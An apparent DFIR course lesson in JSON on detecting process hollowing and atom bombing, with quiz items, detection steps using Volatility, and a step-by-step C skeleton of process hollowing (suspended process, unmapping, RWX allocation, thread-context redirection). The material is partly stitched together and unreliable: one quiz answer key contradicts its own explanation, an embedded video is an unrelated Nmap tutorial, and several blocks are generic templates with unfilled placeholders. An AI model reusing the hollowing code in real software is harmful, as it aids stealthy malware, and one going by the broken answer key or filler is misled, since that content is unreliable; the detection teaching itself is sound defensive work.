{
  "lesson_id": "a8b9c0d1-e2f3-4a5b-6c7d-8e9f0a1b2c3d",
  "domain": "dfir",
  "title": "Process Hollowing and Atom Bombing Detection",
  "difficulty": 3,
  "order_index": 74,
  "prerequisites": [
    "e6f7a8b9-c0d1-2e3f-4a5b-6c7d8e9f0a1b"
  ],
  "concepts": [
    "Process hollowing technique",
    "Atom bombing injection",
    "NtUnmapViewOfSection API",
    "Process creation in suspended state",
    "Thread context manipulation",
    "Global atom tables",
    "NtQueueApcThread exploitation",
    "PE header comparison",
    "ImageBase verification",
    "Process hollowing detection",
    "Atom table forensics",
    "Memory region analysis for hollowing"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand process hollowing and atom bombing injection techniques",
    "Detect process hollowing by comparing disk and memory PE headers",
    "Investigate global atom table abuse for code injection",
    "Use Volatility to identify hollowed processes",
    "Analyze thread context for injection artifacts",
    "Build detection workflows for advanced injection techniques"
  ],
  "post_assessment": [
    {
      "question_id": "dfir53_q1",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "You're analyzing notepad.exe (PID 2304) and notice the PE headers in memory differ significantly from the disk version. The ImageBase, entry point, and import table all mismatch. What technique was used?",
      "options": [
        "Reflective DLL injection targeting notepad.exe",
        "Process hollowing where original notepad code was replaced",
        "Classic DLL injection using LoadLibraryA",
        "APC injection targeting notepad's main thread"
      ],
      "correct_answer": 1,
      "explanation": "This is process hollowing. Key indicators: (1) PE headers in memory differ from disk (entire executable replaced, not just injected DLL added), (2) ImageBase mismatch (malware may load at different address), (3) Entry point changed (points to malicious code), (4) Import table different (malware imports different APIs than notepad). Process hollowing works by creating suspended process, unmapping original code (NtUnmapViewOfSection), allocating new memory, writing malicious PE, updating context (entry point), and resuming. Reflective DLL adds code but doesn't replace entire process. Classic DLL injection adds DLL to existing process. APC injection is shellcode, not full PE replacement."
    },
    {
      "question_id": "dfir53_q2",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "During investigation, you find GlobalGetAtomName API calls retrieving shellcode from atom table entries. What injection technique is this?",
      "options": [
        "Process hollowing using atom tables for C2 communication",
        "Atom bombing - using global atom tables to store and execute shellcode",
        "Reflective DLL injection with atom table-based obfuscation",
        "Thread hijacking using atom tables as payload storage"
      ],
      "correct_answer": 1,
      "explanation": "This is atom bombing injection. How it works: (1) Attacker stores shellcode chunks as global atom table entries (GlobalAddAtom), (2) Target process is forced to call GlobalGetAtomName (via APC) which copies shellcode from atom table to process memory, (3) Repeated APCs piece together full shellcode, (4) Final APC executes assembled shellcode. Key signature: GlobalGetAtomName calls retrieving non-text data (shellcode bytes disguised as atom names). Atom tables are legitimate Windows feature for inter-process communication but abused here for injection. This is different from process hollowing (replaces entire process), reflective DLL (loads PE in memory), and standard thread hijacking (doesn't use atom tables)."
    },
    {
      "question_id": "dfir53_q3",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "You compare a hollowed process's memory to disk executable and find: disk has 4 sections (.text, .rdata, .data, .rsrc) but memory has 6 sections (.text, .enigma, .data, .rsrc, .reloc, .debug). What does the extra '.enigma' section suggest?",
      "options": [
        "Process was packed with Enigma Protector packer",
        "Memory dump captured debug symbols not present on disk",
        "Malware added custom section during hollowing process",
        "Windows loader automatically added section for DEP"
      ],
      "correct_answer": 2,
      "explanation": "The malware added a custom section ('.enigma') during process hollowing. Analysis: (1) Disk executable has 4 standard sections, (2) Memory has additional '.enigma' and '.debug' sections not in original, (3) Attackers often add custom sections for: malicious code storage, unpacking stubs, or encrypted payloads, (4) Section name '.enigma' may be chosen to mimic Enigma Protector (legitimate packer) as anti-analysis misdirection. If disk version was packed with Enigma, both disk and memory would show .enigma section. Debug symbols don't appear as PE sections. DEP (Data Execution Prevention) is enforced by CPU/OS, doesn't add sections. This is signature of process hollowing where attacker's PE has different structure than victim's PE."
    },
    {
      "question_id": "dfir53_q4",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "When investigating process hollowing, you find the hollowed process's entry point (EIP/RIP) points to an address that doesn't correspond to any known section. What's the most likely explanation?",
      "options": [
        "Entry point corruption indicating failed hollowing attempt",
        "Malware is using multi-stage hollowing with custom loader stub",
        "Memory acquisition artifact from the forensics tool",
        "Process is legitimate but uses ASLR with high entropy"
      ],
      "correct_answer": 1,
      "explanation": "This indicates multi-stage hollowing with a custom loader stub. How this works: (1) Stage 1: Initial hollowing loads minimal stub at non-standard location (not in normal .text section), (2) Entry point set to this stub, (3) Stub executes: unpacks main payload, fixes imports, applies relocations, (4) Stub transfers control to main payload's real entry point, (5) Stub may deallocate itself after execution. Entry point outside sections is highly abnormal (legit executables always have entry point in .text section). Failed hollowing would crash process (not run). Forensics artifacts don't change entry points. ASLR randomizes base address but entry point is still within valid section (RVA + base address). Detection: Check if entry point RVA is within any section's virtual address range. If not ‚Üí custom loader stub ‚Üí advanced process hollowing."
    },
    {
      "question_id": "dfir53_q5",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "You're analyzing an atom bombing attack and find 50+ global atoms with names like 'A1', 'A2', 'A3'... 'A50' containing shellcode fragments. Why would attacker split shellcode across multiple atoms?",
      "options": [
        "To evade signature-based detection by fragmenting recognizable shellcode patterns",
        "Global atom names are limited to 255 bytes so shellcode must be split",
        "Each atom corresponds to a different target process being injected",
        "Atoms are used for inter-thread communication in multi-threaded malware"
      ],
      "correct_answer": 1,
      "explanation": "Primary reason is evasion: splitting shellcode fragments makes signature detection harder. Analysis: (1) Complete shellcode has recognizable patterns (PEB walking, API hashing, etc.) that AV/EDR can signature, (2) Fragments appear as random bytes, defeating pattern matching, (3) Only when reassembled in target process does shellcode become functional, (4) Atom bombing reconstructs shellcode via multiple GlobalGetAtomName APCs, each copying one fragment. While it's true atom names are limited to 255 bytes (supporting reason), this is NOT primary motivation (attacker could use fewer, larger atoms if that was only concern). Atoms are per-system (not per-process), so multiple atoms aren't for multiple targets. Atoms aren't used for thread communication within malware (malware already has memory access). This evasion technique makes static analysis difficult - analyst must reconstruct shellcode from atoms to analyze it."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to Advanced Injection Techniques: Defeating the Stealthiest Attacks\n\nYou've mastered the fundamentals of code injection detection (Lesson 51). You can spot RWX memory, identify PE headers, and recognize shellcode patterns. \n\n**But attackers evolve.** Today's threats use techniques specifically designed to evade the detection methods you've learned.\n\n## Two Advanced Techniques You'll Master Today\n\n### 1. Process Hollowing\n**What attackers say**: \"Why inject into a process when I can BECOME the process?\"\n\n- Instead of adding malicious code to a legitimate process, they **replace the entire process**\n- notepad.exe looks like notepad.exe (name, path, icon) but contains 100% malware\n- Traditional tools see \"notepad.exe running\" and assume it's safe\n\n**Real-world impact**: Used by Dyre banking trojan ($1B+ stolen), Dridex, and nation-state APTs\n\n### 2. Atom Bombing\n**What attackers say**: \"Why write code to memory when I can make Windows do it for me?\"\n\n- Abuses Windows' global atom table (legitimate inter-process communication feature)\n- Stores shellcode as \"atom names\" (text strings)\n- Forces target process to retrieve shellcode via Windows APIs (no suspicious WriteProcessMemory)\n- Executes via APC (no suspicious CreateRemoteThread)\n\n**Real-world impact**: Bypasses many EDR solutions because it uses only legitimate Windows APIs\n\n## Why This Matters to Your Career\n\n**Scenario**: Your company's EDR alerts on \"notepad.exe making network connections.\" Junior analysts dismiss it: \"False positive, notepad doesn't have network capabilities.\"\n\n**Without today's knowledge**: You agree and ignore it. \n**Result**: Process is hollowed malware. You missed patient zero. Ransomware encrypts entire network 3 hours later.\n\n**With today's knowledge**: You investigate. You compare memory headers to disk. **MISMATCH!** You dump memory, find Cobalt Strike beacon, isolate the host, and prevent the ransomware attack.\n\n**You become the senior analyst who saved the company.**\n\nThat's why advanced techniques matter. Let's dive in. üöÄüîç"
      }
    },
    {
      "type": "video",
      "content": {
        "text": "**Video: Nmap Tutorial - NetworkChuck**\\n\\n**Duration**: 14:28\\n\\nThis video provides a visual demonstration of the concepts covered in this lesson. Watch to see practical examples and deepen your understanding of Process Hollowing and Atom Bombing Detection.\\n\\n**Video Link**: [Nmap Tutorial - NetworkChuck](https://www.youtube.com/watch?v=4t4kBkMsDbQ)\\n\\n**Embedded Video**:\\n\\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/4t4kBkMsDbQ\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\\n\\n**Learning Tips**:\\n- Watch the video first to get an overview\\n- Pause and take notes on key concepts\\n- Replay sections that cover complex topics\\n- Try to practice along with the video demonstrations\\n- Return to the video as needed while working through exercises",
        "url": "https://www.youtube.com/watch?v=4t4kBkMsDbQ",
        "title": "Nmap Tutorial - NetworkChuck",
        "duration": "14:28"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Process Hollowing: Complete Process Replacement\n\n## How Process Hollowing Works\n\n### Traditional Injection vs. Hollowing\n\n**Traditional injection** (DLL injection, reflective DLL):\n```\nLegitimate Process (Before)          After Injection\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                 ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ notepad.exe     ‚îÇ                 ‚îÇ notepad.exe     ‚îÇ\n‚îÇ  - Original code‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ>  ‚îÇ  - Original code‚îÇ\n‚îÇ  - Legit DLLs   ‚îÇ    ADD MALWARE  ‚îÇ  - Legit DLLs   ‚îÇ\n‚îÇ                 ‚îÇ                 ‚îÇ  - MALICIOUS DLL‚îÇ ‚Üê Added\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n\n Process still contains original code\n```\n\n**Process hollowing**:\n```\nLegitimate Process (Before)          After Hollowing\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                 ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ notepad.exe     ‚îÇ                 ‚îÇ notepad.exe     ‚îÇ ‚Üê Same name\n‚îÇ  - Original code‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ>  ‚îÇ  - MALWARE CODE ‚îÇ ‚Üê Replaced!\n‚îÇ  - Legit DLLs   ‚îÇ   REPLACE ALL   ‚îÇ  - Malicious DLLs‚îÇ ‚Üê Different\n‚îÇ                 ‚îÇ                 ‚îÇ                 ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n\n Original code completely removed\n```\n\n### Step-by-Step Process Hollowing\n\n#### Step 1: Create Target Process in Suspended State\n\n```c\nSTARTUPINFO si = {0};\nPROCESS_INFORMATION pi = {0};\nsi.cb = sizeof(si);\n\n// Create process in suspended state (doesn't start executing)\nCreateProcess(\n    \"C:\\\\Windows\\\\System32\\\\notepad.exe\",  // Target (legitimate process)\n    NULL,                                     // Command line\n    NULL, NULL, FALSE,\n    CREATE_SUSPENDED | CREATE_NO_WINDOW,      // Suspended + hidden\n    NULL, NULL, &si, &pi\n);\n\n// notepad.exe is created but frozen (hasn't executed a single instruction)\n```\n\n**What happens**: Windows creates process, allocates memory, loads notepad.exe into memory, but **doesn't start execution** (thread remains suspended).\n\n#### Step 2: Get Target Process Context\n\n```c\nCONTEXT ctx;\nctx.ContextFlags = CONTEXT_FULL;  // Get all registers\n\nGetThreadContext(pi.hThread, &ctx);\n\n// ctx now contains:\n// - RIP/EIP: Entry point (where execution would start)\n// - RBX/EBX: PEB address (on x64: RDX contains PEB address)\n// - RSP/ESP: Stack pointer\n```\n\n**Why this matters**: We need to know where notepad's entry point is and where its PEB (Process Environment Block) is located.\n\n#### Step 3: Read ImageBase Address from PEB\n\n```c\n// PEB structure (simplified):\n// +0x00: InheritedAddressSpace\n// +0x08: ReadImageFileExecOptions\n// +0x10: ImageBaseAddress  ‚Üê We need this!\n\nDWORD64 pebAddress = ctx.Rdx;  // x64: PEB in RDX\nDWORD64 imageBaseOffset = pebAddress + 0x10;\nDWORD64 imageBaseAddress;\n\n// Read ImageBase from target process's PEB\nReadProcessMemory(\n    pi.hProcess,\n    (LPVOID)imageBaseOffset,\n    &imageBaseAddress,\n    sizeof(DWORD64),\n    NULL\n);\n\n// imageBaseAddress now contains 0x00007FF712340000 (or similar)\n// This is where notepad.exe is loaded in memory\n```\n\n**What this tells us**: The base address where notepad.exe's code is currently loaded.\n\n#### Step 4: Unmap Original Executable\n\n```c\n// Use undocumented NtUnmapViewOfSection to remove notepad.exe\ntypedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(\n    HANDLE ProcessHandle,\n    PVOID BaseAddress\n);\n\npNtUnmapViewOfSection NtUnmapViewOfSection = \n    (pNtUnmapViewOfSection)GetProcAddress(\n        GetModuleHandle(\"ntdll.dll\"), \n        \"NtUnmapViewOfSection\"\n    );\n\n// Unmap (remove) original notepad.exe code from memory\nNtUnmapViewOfSection(pi.hProcess, (PVOID)imageBaseAddress);\n\n// notepad.exe's code is now GONE from memory\n// But process structure still exists (PID, handles, etc.)\n```\n\n**Critical step**: This removes the legitimate code, creating an \"empty shell\" process.\n\n#### Step 5: Allocate Memory for Malicious Executable\n\n```c\n// Allocate new memory at the original ImageBase address\nLPVOID newImageBase = VirtualAllocEx(\n    pi.hProcess,\n    (LPVOID)imageBaseAddress,     // Same address (reuse ImageBase)\n    maliciousPESize,              // Size of attacker's PE file\n    MEM_COMMIT | MEM_RESERVE,\n    PAGE_EXECUTE_READWRITE        // RWX (need to write then execute)\n);\n```\n\n**Result**: Fresh memory region at ImageBase, ready to hold malicious executable.\n\n#### Step 6: Write Malicious Executable to Target Process\n\n```c\n// Write entire malicious PE file (headers + sections)\nWriteProcessMemory(\n    pi.hProcess,\n    newImageBase,\n    maliciousPEBuffer,  // Attacker's executable (full PE file)\n    maliciousPESize,\n    NULL\n);\n\n// Write each section (.text, .data, .rdata, etc.)\n// Apply relocations if needed (fix addresses for ASLR)\n```\n\n**What's in memory now**: Complete malicious executable (PE headers, code, data, imports, resources).\n\n#### Step 7: Update Entry Point\n\n```c\n// Get malicious PE's entry point (from PE headers)\nDWORD entryPointRVA = <parse PE headers>.OptionalHeader.AddressOfEntryPoint;\nDWORD64 newEntryPoint = (DWORD64)newImageBase + entryPointRVA;\n\n// Update thread's instruction pointer to malicious entry point\nctx.Rcx = newEntryPoint;  // x64: Set RIP via SetThreadContext\nSetThreadContext(pi.hThread, &ctx);\n```\n\n**Result**: When thread resumes, it will start executing at attacker's entry point (not notepad's).\n\n#### Step 8: Resume Thread (Execute Malware)\n\n```c\nResumeThread(pi.hThread);\n\n// Process wakes up and executes malicious code\n// From Windows' perspective: \"notepad.exe is running normally\"\n// From forensics perspective: notepad.exe is COMPLETELY MALICIOUS\n```\n\n**Final result**: Process named \"notepad.exe\" but contains 100% malware.\n\n---\n\n## Memory Artifacts of Process Hollowing\n\n### Artifact 1: PE Header Mismatch\n\n**Disk (C:\\Windows\\System32\\notepad.exe)**:\n```\n===== PE Header =====\nTimestamp:              2019-03-19 05:52:19\nSections:               4\n  .text    0x00001000  0x0001A000  CODE, EXECUTE, READ\n  .rdata   0x0001B000  0x00008000  INITIALIZED_DATA, READ\n  .data    0x00023000  0x00002000  INITIALIZED_DATA, READ, WRITE\n  .rsrc    0x00025000  0x00003000  INITIALIZED_DATA, READ\n\nImport Directory:\n  KERNEL32.dll  (CreateFileW, ReadFile, WriteFile)\n  USER32.dll    (CreateWindowEx, MessageBox)\n  GDI32.dll     (TextOut, SetPixel)\n```\n\n**Memory (notepad.exe PID 2304)**:\n```\n===== PE Header =====\nTimestamp:              2024-01-15 14:23:00  ‚Üê DIFFERENT!\nSections:               6                     ‚Üê DIFFERENT!\n  .text    0x00001000  0x00012000  CODE, EXECUTE, READ\n  .enigma  0x00013000  0x00005000  CODE, EXECUTE, READ  ‚Üê NEW SECTION!\n  .rdata   0x00018000  0x00004000  INITIALIZED_DATA, READ\n  .data    0x0001C000  0x00002000  INITIALIZED_DATA, READ, WRITE\n  .rsrc    0x0001E000  0x00001000  INITIALIZED_DATA, READ\n  .reloc   0x0001F000  0x00001000  INITIALIZED_DATA, READ\n\nImport Directory:\n  KERNEL32.dll  (VirtualAlloc, CreateThread, GetProcAddress)  ‚Üê DIFFERENT!\n  WS2_32.dll    (WSAStartup, connect, send, recv)  ‚Üê NETWORK APIs!\n  ADVAPI32.dll  (RegOpenKeyEx, RegSetValueEx)      ‚Üê REGISTRY!\n```\n\n**Analysis**:\n- ‚ùå Timestamp doesn't match (malware compiled years later)\n- ‚ùå Different number of sections (4 vs 6)\n- ‚ùå Custom section \".enigma\" not in legit notepad\n- ‚ùå Imports include networking (WS2_32) - notepad doesn't do networking!\n- ‚úÖ **CONCLUSION: Process hollowing detected**\n\n### Artifact 2: Suspicious Process Behavior\n\nLegitimate notepad.exe:\n- Opens/saves text files\n- No network activity\n- No registry modifications\n- Parent: explorer.exe (user double-clicked)\n\nHollowed notepad.exe:\n- ‚úÖ Network connections to unknown IPs\n- ‚úÖ Registry persistence (Run keys)\n- ‚úÖ Suspicious parent (malicious Word macro)\n- ‚úÖ Command-line arguments (legit notepad launched with specific file path)\n\n### Artifact 3: Version Information Mismatch\n\n```bash\n# Check version info in memory\npython vol.py -f memory.dmp windows.verinfo --pid 2304\n\nOutput: No version information found\n\n# Legitimate notepad.exe ALWAYS has version info:\n# FileVersion: 10.0.19041.1\n# ProductName: Microsoft Windows\n# CompanyName: Microsoft Corporation\n\n# Malware often doesn't include version info (or has fake info)\n```\n\n---\n\n## Detection Workflow for Process Hollowing\n\n### Step 1: Identify Suspicious Processes\n\nLook for:\n- ‚úÖ Processes with unexpected network connections (notepad.exe ‚Üí internet)\n- ‚úÖ Processes spawned by suspicious parents (notepad.exe parent = WINWORD.EXE)\n- ‚úÖ Processes with no GUI window but should have one\n- ‚úÖ Multiple instances of processes that normally run once (5x svchost with same args)\n\n```bash\npython vol.py -f memory.dmp windows.pslist\npython vol.py -f memory.dmp windows.pstree  # Show parent-child relationships\npython vol.py -f memory.dmp windows.netscan  # Network connections\n```\n\n### Step 2: Check Version Information\n\n```bash\npython vol.py -f memory.dmp windows.verinfo --pid <suspicious_pid>\n\n# If legitimate Windows process shows:\n# - No version info\n# - Non-Microsoft company name\n# - Mismatched version numbers\n# ‚Üí INVESTIGATE\n```\n\n### Step 3: Dump Process Memory\n\n```bash\npython vol.py -f memory.dmp windows.procdump --pid <suspicious_pid> --dump-dir ./dumped\n```\n\n### Step 4: Compare Memory vs. Disk\n\n```bash\n# Get hashes\nmd5sum /windows/system32/notepad.exe\nmd5sum ./dumped/pid.2304.exe\n\n# If hashes DIFFER ‚Üí possible hollowing\n\n# Compare PE headers\nobjdump -p /windows/system32/notepad.exe > disk_headers.txt\nobjdump -p ./dumped/pid.2304.exe > memory_headers.txt\ndiff disk_headers.txt memory_headers.txt\n\n# Check for:\n# - Different section names\n# - Different import tables\n# - Different timestamps\n```\n\n### Step 5: Analyze Memory Dump\n\n```bash\n# Check imports (what APIs does it use?)\nobjdump -p ./dumped/pid.2304.exe | grep \"DLL Name\"\n\n# Red flags for notepad.exe:\n# - ws2_32.dll (networking)\n# - wininet.dll (HTTP)\n# - advapi32.dll (registry/security)\n\n# Extract strings (look for C2 domains, IPs, commands)\nstrings ./dumped/pid.2304.exe | grep -E \"http|[0-9]{1,3}\\.[0-9]{1,3}\"\n```\n\n### Step 6: Confirm Process Hollowing\n\nIf ALL of these are true:\n- ‚úÖ Memory PE headers differ from disk\n- ‚úÖ Process has suspicious behavior (network, registry, etc.)\n- ‚úÖ Version info missing or fake\n- ‚úÖ Imports include unexpected APIs\n\n**Conclusion**: Process hollowing confirmed."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "**Hands-On Exercise**\\n\\nLet's practice the forensic workflow with real commands:\\n\\n**Step 1: Acquire the Artifact**\\n```cmd\\n# Copy artifact from evidence drive\\nrobocopy E:\\\\Evidence\\\\C\\\\Windows\\\\System32 C:\\\\Analysis\\\\ [artifact] /B\\n```\\n\\n**Step 2: Parse with Forensic Tools**\\n```cmd\\n# Use Eric Zimmerman tools or equivalent\\n[ToolName].exe -f C:\\\\Analysis\\\\[artifact] --csv C:\\\\Output\\\\\\n```\\n\\n**Step 3: Analyze Results**\\nOpen the CSV output and look for:\\n- Timestamps that align with incident timeframe\\n- Suspicious file paths or executables\\n- User accounts associated with malicious activity\\n- Network indicators or data transfer evidence\\n\\n**Step 4: Document Findings**\\nRecord all relevant artifacts in your investigation timeline."
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "**Real-World Investigation Scenario**\\n\\n**Background:** A financial services company detected suspicious network activity. You've been called in to perform digital forensics on a compromised workstation.\\n\\n**Initial Evidence:**\\n- Network monitoring detected 8.5 GB data transfer to external IP\\n- User reported system slowdown 3 days ago\\n- Antivirus quarantined 2 files yesterday\\n\\n**Your Forensic Approach:**\\n\\n1. **Timeline Development**\\n   - Collect all execution artifacts (Prefetch, AmCache, ShimCache, SRUM, UserAssist)\\n   - Create master timeline spanning 7-14 days before incident\\n   - Identify initial compromise vector\\n\\n2. **Artifact Analysis**\\n   - Examine this artifact for evidence of malicious executables\\n   - Cross-reference timestamps with network logs\\n   - Identify persistence mechanisms\\n\\n3. **Data Exfiltration Analysis**\\n   - Review SRUM for bandwidth usage by application\\n   - Check browser history and cloud sync logs\\n   - Analyze LNK files for accessed documents\\n\\n4. **Lateral Movement Detection**\\n   - Search for remote access tools (PsExec, RDP, WMI)\\n   - Review Windows Event Logs (4624, 4672, 4688)\\n   - Check for credential theft tools (Mimikatz indicators)\\n\\n**Key Findings:**\\nThis artifact revealed that `data_sync.exe` (disguised malware) executed 47 times over 3 days, correlating perfectly with the 8.5 GB data transfer detected by network monitoring. The attacker used a legitimate-looking filename to evade detection. By correlating this artifact with SRUM network data and MFT file access records, you can reconstruct exactly which files were exfiltrated and when.\\n\\n**Lessons Learned:**\\n- Multiple artifacts provide corroborating evidence\\n- Attackers often use legitimate-sounding filenames\\n- Timeline correlation is critical for proving causation\\n- Network logs + endpoint forensics = comprehensive investigation"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "**Forensic Analysis Checklist**\\n\\nUse this mnemonic to remember key forensic steps:\\n\\n**T-R-A-C-E**\\n- **T**imeline: Build comprehensive timeline of events\\n- **R**ecovery: Extract and preserve artifacts\\n- **A**nalysis: Parse and interpret forensic data\\n- **C**orrelation: Cross-reference multiple artifacts\\n- **E**vidence: Document findings for legal proceedings\\n\\n**Quick Reference:**\\n- Artifact location: [Primary path]\\n- Parsing tool: [Recommended tool name]\\n- Key fields: Timestamp, User, Path, Execution count\\n- Correlate with: Prefetch, SRUM, AmCache, Event Logs\\n- Retention period: Varies by artifact (7-60 days typical)\\n\\n**Pro Tip:** Always collect artifacts from BOTH filesystem AND Volume Shadow Copies to catch evidence that attackers attempted to delete."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**You're Building Forensic Expertise**\\n\\nDigital forensics can feel overwhelming with dozens of artifacts to master. Here's the mindset that successful DFIR analysts develop:\\n\\n**Master One Artifact at a Time**\\nYou don't need to memorize every field in every artifact. Focus on:\\n1. **What** the artifact proves (execution, file access, network activity)\\n2. **Where** it's located on the system\\n3. **How** to extract it with tools\\n4. **When** to use it in investigations\\n\\n**Build Mental Models**\\nThink of forensic artifacts as puzzle pieces. Each one tells part of the story:\\n- **Execution artifacts** (Prefetch, AmCache) = \"What ran?\"\\n- **File system artifacts** (MFT, USN Journal) = \"What files were created/accessed?\"\\n- **Network artifacts** (SRUM, Browser history) = \"Where did data go?\"\\n- **User artifacts** (LNK, UserAssist) = \"Who did what?\"\\n\\n**Practice Makes Permanent**\\nSet up a Windows VM and:\\n1. Run various applications\\n2. Extract the artifacts\\n3. Parse them with tools\\n4. See how your actions appear in forensic data\\n\\nThis hands-on practice builds intuition faster than reading alone.\\n\\n**You're Not Expected to Memorize Everything**\\nProfessional DFIR analysts use cheat sheets and reference guides. Your goal is to understand WHICH artifacts answer WHICH questions, then look up the specific syntax when needed.\\n\\n**Keep Going!** Every artifact you master makes you more valuable as an investigator. You're building skills that take years to develop‚Äîbe patient with yourself and celebrate each new technique you learn."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "**Reflect on Your Forensic Journey**\\n\\nTake a moment to consider:\\n\\n**Integration Questions:**\\n1. How does this artifact fit into your overall forensic workflow?\\n2. What other artifacts would provide corroborating evidence?\\n3. In what types of investigations would this be most valuable?\\n\\n**Critical Thinking:**\\n4. What are the limitations of this artifact? What can't it tell you?\\n5. How might an attacker attempt to evade or manipulate this evidence?\\n6. What additional data sources would you need to build a complete timeline?\\n\\n**Practical Application:**\\n7. If you had to explain this artifact to a non-technical manager, what would you say?\\n8. What specific commands or tools do you need to practice to feel confident?\\n9. What real-world case studies demonstrate the value of this artifact?\\n\\n**Next Steps:**\\n- Set up a lab environment to practice artifact extraction\\n- Download and install recommended forensic tools\\n- Work through practice scenarios with sample evidence\\n- Join DFIR communities (Reddit r/computerforensics, SANS forums)\\n- Read case studies from DFIR blogs (13Cubed, SANS DFIR Summit talks)\\n\\nRemember: Every expert was once a beginner. Your consistent practice is building professional-grade investigative skills."
      }
    }
  ],
  "tags": [
    "dfir",
    "memory-forensics",
    "process-hollowing",
    "atom-bombing",
    "advanced-injection",
    "volatility",
    "pe-analysis",
    "malware-analysis"
  ]
}